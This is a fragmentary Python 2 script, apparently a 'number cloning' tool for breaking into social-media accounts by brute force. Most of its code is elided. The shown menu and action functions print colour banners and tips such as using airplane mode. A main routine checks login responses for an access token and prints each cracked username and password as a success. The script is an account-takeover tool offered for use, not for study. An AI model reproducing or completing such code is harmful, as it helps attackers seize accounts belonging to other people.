...
def menu():
    ...
    jalan ('\x1b[1;96m[1] START  Number Cloning Now ')
...
def action():
    ...
    jalan ('\x1b[1;97mYOU CAN USE THIS TOOL WITHOUT DATA. USE AIRPLANE MOOD AFTER 10MINS')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[92m  [Sucessfull-SAHIL-BRO-ZAIN]  ' + k + c + user + '  |  ' + pass1
